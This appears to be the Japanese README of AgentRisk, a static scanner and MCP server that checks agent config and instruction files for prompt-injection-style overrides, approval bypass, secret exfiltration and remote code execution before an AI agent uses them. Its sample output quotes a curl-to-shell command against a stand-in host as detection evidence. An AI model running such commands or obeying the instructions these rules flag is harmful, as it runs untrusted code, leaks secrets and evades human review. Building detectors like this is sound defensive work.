# AgentRisk

[![CI](https://github.com/Renga154/agentrisk/actions/workflows/ci.yml/badge.svg)](https://github.com/Renga154/agentrisk/actions/workflows/ci.yml)
[![npm](https://img.shields.io/npm/v/agentrisk.svg)](https://www.npmjs.com/package/agentrisk)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

[English](README.md) | [日本語](README.ja.md)

AgentRisk は、AI に作業を任せる前に未知のリポジトリやパッケージを確認する **「開く前スキャン」CLI / MCP サーバー** です。AI コーディングエージェントが指示ファイルを読んだり、MCP サーバーやインストールスクリプトを動かしたりする前に、危険な設定や怪しい命令をゼロ実行で検出します。

`.mcp.json`、`AGENTS.md`、`SKILL.md`、Cursor rules、Copilot instructions、`package.json` のための安全確認ゲートとして使えます。「外部スクリプトをダウンロードして実行する」「secret を渡す」「承認を無視する」といった危険パターンを、AI が従ってしまう前に見つけます。

![AgentRisk demo](https://raw.githubusercontent.com/Renga154/agentrisk/main/assets/agentrisk-demo.gif)

MCP サーバーには接続しません。package script は実行しません。対象の依存関係はインストールしません。ワークスペースが安全かどうかを LLM に判定させることもありません。

```bash
npx --yes agentrisk@latest scan https://github.com/owner/suspicious-agent-repo
npx --yes agentrisk@latest scan npm:some-mcp-server@1.2.3
npx --yes agentrisk@latest scan ./downloaded-agent.tgz
npx --yes agentrisk@latest mcp config
```

```text
AgentRisk scan
Source: github owner/suspicious-agent-repo
Root: /repo
Files: 3 scanned, 3 matched
Verdict: BLOCK
Findings: 3 critical, 4 high, 2 medium

CRITICAL
  mcp-remote-fetch-exec [high]
    MCP server "bootstrap" appears to download and execute remote code.
    .mcp.json:5:23
    evidence: bash -c curl https://example.invalid/install.sh | sh
    fix: Pin a reviewed package or binary and avoid curl-to-shell, wget-to-shell, or PowerShell Invoke-Expression bootstraps.
```

## クイックスタート

AgentRisk をインストールせずに、リポジトリ、npm package、local archive をスキャンできます。

```bash
npx --yes agentrisk@latest scan github:owner/repo#main
npx --yes agentrisk@latest scan npm:some-mcp-server@1.2.3
npx --yes agentrisk@latest scan ./downloaded-agent.tgz
```

MCP クライアントに追加する設定を出力するには、次を実行します。

```bash
npx --yes agentrisk@latest mcp config
```

そのままコピーできる設定が出ます。

```json
{
  "mcpServers": {
    "agentrisk": {
      "command": "npx",
      "args": ["-y", "agentrisk@latest", "mcp"]
    }
  }
}
```

判定の目安は、`pass` は実行してよい、`review` は人間の確認が必要、`block` はまだ実行しない、`incomplete` は parse/read error を直すまで信頼しない、です。

## なぜ作ったか

AI エージェントは、リポジトリ内の指示を読み、ローカル設定からツールを起動するようになっています。つまり `.mcp.json`、`AGENTS.md`、`.cursor/rules/*`、`SKILL.md`、`.github/agents/*`、`package.json` のようなファイルは、エージェント時代のサプライチェーンの一部です。

AgentRisk は、開発者とセキュリティチームのための、ローカルで確認できるゲートです。

- 信頼していないエージェントリポジトリ、パッケージ、アーカイブを、開いたりインストールしたりする前にスキャンする
- 危険な MCP 起動コマンドや secret を含む環境変数の受け渡しを検出する
- リポジトリ指示ファイル内の prompt injection 風の記述を検出する
- GitHub code scanning 用の SARIF を生成する
- すべてのチェックを決定的かつ監査可能に保つ

## スキャン対象

AgentRisk は現在、次のファイルを検出します。

- `.mcp.json`
- `mcp.json`
- `claude_desktop_config.json`
- `.cursor/rules/**/*`
- `.github/agents/**/*`
- `SKILL.md`
- `AGENTS.md`
- `CLAUDE.md`
- `GEMINI.md`
- `.github/copilot-instructions.md`
- `package.json`

## 組み込みルール

| Rule | Default | 検出するもの |
| --- | --- | --- |
| `mcp-remote-fetch-exec` | critical | リモートコードをダウンロードして実行する MCP コマンド |
| `mcp-privileged-container` | critical | ホスト権限や機微な mount を伴う Docker MCP 起動 |
| `mcp-shell-wrapper-command` | high | shell wrapper の裏に隠された MCP 起動コマンド |
| `mcp-unpinned-dlx` | medium | バージョン pin が明確でない package / language / container launcher |
| `mcp-sensitive-env-pass-through` | high | secret らしい環境変数、または広すぎる env forwarding |
| `mcp-external-binary-reference` | medium | スキャン対象外の絶対パス実行ファイル |
| `package-postinstall-remote-exec` | critical | install lifecycle script 内のリモート実行 |
| `package-script-shell-trampoline` | medium | shell 文字列の裏に挙動を隠す package script |
| `instruction-secret-exfiltration` | critical | secret を読ませる、出力させる指示 |
| `instruction-approval-bypass` | high | approval や review の回避を促す指示 |
| `instruction-policy-override` | high | prompt injection 風の上書き命令 |
| `instruction-remote-tool-install` | medium | 外部ツールのインストールや実行を促す指示 |
| `conflicting-agent-instructions` | medium | エージェント指示ファイル間の矛盾した安全指示 |

ルールパックを確認するには、次を実行してください。

```bash
npx --yes agentrisk@latest rules list
npx --yes agentrisk@latest rules show mcp-remote-fetch-exec
```

同梱 corpus では現在、**benign 3/3 clean**、**malicious 5/5 detected** です。詳細は `npm run corpus:evaluate` で生成される [docs/corpus-report.md](docs/corpus-report.md) を参照してください。

## 信頼する前にスキャンする

インストールせずに使う場合:

```bash
npx --yes agentrisk@latest scan .
```

リモートアーティファクトのプリフライト:

```bash
# GitHub repo default branch
npx --yes agentrisk@latest scan https://github.com/modelcontextprotocol/servers

# GitHub shorthand with a ref
npx --yes agentrisk@latest scan github:owner/repo#v1.2.3

# npm package tarball, downloaded and extracted without running scripts
npx --yes agentrisk@latest scan npm:some-mcp-server@1.2.3

# Local or remote tarballs
npx --yes agentrisk@latest scan ./agent-server.tgz
npx --yes agentrisk@latest scan https://example.com/agent-server.tar.gz
```

remote / npm / archive target では、`--config` を明示しない限り、対象物に含まれる `agentrisk.config.json` は無視されます。信頼していないアーティファクト自身に、スキャン設定を弱める権限を与えないためです。

## インストール

グローバルインストール:

```bash
npm install -g agentrisk
agentrisk scan .
```

checkout したリポジトリから使う場合:

```bash
npm install
npm run build
node dist/cli.cjs scan .
node dist/mcp-cli.cjs
```

## CLI

```bash
agentrisk scan [path]
agentrisk rules list
agentrisk rules show <ruleId>
agentrisk config print [path]
agentrisk schema config
agentrisk schema report
agentrisk mcp
agentrisk mcp config
```

よく使う scan option:

```bash
agentrisk scan . --format terminal
agentrisk scan . --format json --output agentrisk.json
agentrisk scan . --format markdown --output agentrisk.md
agentrisk scan . --format sarif --output agentrisk.sarif
agentrisk scan github:owner/repo#main --max-download-size 25000000
agentrisk scan . --fail-on medium
agentrisk scan . --exclude-rule mcp-unpinned-dlx
agentrisk scan . --gitignore
```

## MCP サーバー

AgentRisk はローカルの stdio MCP サーバーとしても起動できます。LLM クライアントから、未知のリポジトリやパッケージを信頼する前に AgentRisk スキャンを呼び出せます。

公開されるツールは次の1つです。

- `agentrisk_scan`: ローカルパス、GitHub target、npm package、archive を静的スキャンし、LLM が読みやすい要約と構造化された AgentRisk report を返す

直接起動する場合:

```bash
npx --yes agentrisk@latest mcp
```

設定 snippet を生成する場合:

```bash
npx --yes agentrisk@latest mcp config
```

MCP クライアント設定例:

```json
{
  "mcpServers": {
    "agentrisk": {
      "command": "npx",
      "args": ["-y", "agentrisk@latest", "mcp"]
    }
  }
}
```

tool input 例:

```json
{
  "target": "github:owner/repo#main",
  "profile": "strict",
  "minSeverity": "medium",
  "failOn": "high",
  "maxFindings": 25
}
```

MCP モードでも安全モデルは CLI と同じです。ローカルファイルを読み、明示的に指定された GitHub / npm / archive target をダウンロードすることはありますが、対象コードの実行、package script の実行、依存関係のインストール、対象 MCP サーバーへの接続は行いません。

終了コード:

- `0`: スキャン完了、かつ `--fail-on` 以上の finding なし
- `1`: スキャン完了かつ `--fail-on` 以上の finding あり、またはスキャンが不完全
- `2`: コマンド使用法または設定が不正
- `3`: ランタイム失敗

## 設定

`agentrisk.config.json` を作成します。

```json
{
  "version": 1,
  "profile": "recommended",
  "failOn": "high",
  "minSeverity": "low",
  "exclude": ["**/fixtures/**"],
  "rules": {
    "mcp-unpinned-dlx": "low",
    "instruction-remote-tool-install": "off"
  }
}
```

`profile: "strict"` は medium severity の finding を high に引き上げます。サプライチェーンや policy signal をより厳格に CI で落としたいリポジトリで便利です。

解決済み設定を表示:

```bash
agentrisk config print .
```

schema を生成:

```bash
agentrisk schema config > agentrisk-config.schema.json
agentrisk schema report > agentrisk-report.schema.json
```

## GitHub Actions

同梱 action を使う場合:

```yaml
name: AgentRisk

on:
  pull_request:

jobs:
  agentrisk:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@v5
      - uses: Renga154/agentrisk@v0.2.1
        with:
          format: sarif
          output: agentrisk.sarif
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: agentrisk.sarif
```

npm package を直接実行する場合:

```yaml
name: AgentRisk

on:
  pull_request:
  push:
    branches: [main]

jobs:
  agentrisk:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@v5
      - uses: actions/setup-node@v5
        with:
          node-version: 22
      - run: npx --yes agentrisk@0.2.1 scan . --format sarif --output agentrisk.sarif
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: agentrisk.sarif
```

## セキュリティモデル

AgentRisk は静的スキャナーです。実行前に危険なパターンを表面化するための道具であり、ワークスペースが安全であることを証明するものではありません。

AgentRisk が行うこと:

- 対象ワークスペース内のファイルを読む
- 明示的に remote / npm / archive target を渡した場合に、それをダウンロードする
- 既知の設定形式と指示形式を parse する
- 決定的な組み込みルールを実行する
- evidence と location を含むレポートを出力する

AgentRisk が行わないこと:

- MCP サーバーを実行する
- package script を実行する
- 対象の依存関係をインストールする
- target の `.gitignore` をデフォルトで信用する
- remote / npm / archive target に含まれる AgentRisk 設定を信用する
- model provider に接続する
- MCP クライアントを介さず、自分で LLM に内容を送信する
- ワークスペース内容をリモートサービスへ送信する
- false positive がない、または完全な coverage があると保証する

## Roadmap

- 実世界の reduced case を使って public malicious / benign corpus を拡張する
- 隣接ツールとの head-to-head evaluation notes を追加する
- 大規模リポジトリ向けの baseline suppression files を追加する
- 署名付き community rule pack を追加する
- tools / data reach / network egress の capability graph analysis を拡張する
- marketplace metadata と packaged skills の coverage を拡張する

## Development

```bash
npm install
npm test
npm run typecheck
npm run build
npm run check
```

## Responsible Disclosure

AgentRisk が危険なパターンを見逃している、または安全でない助言をしていると思われる場合は、リポジトリ公開後に GitHub の private security advisory を開いてください。通常の false positive は、最小再現 fixture 付きで issue を開いてください。

## License

Apache-2.0
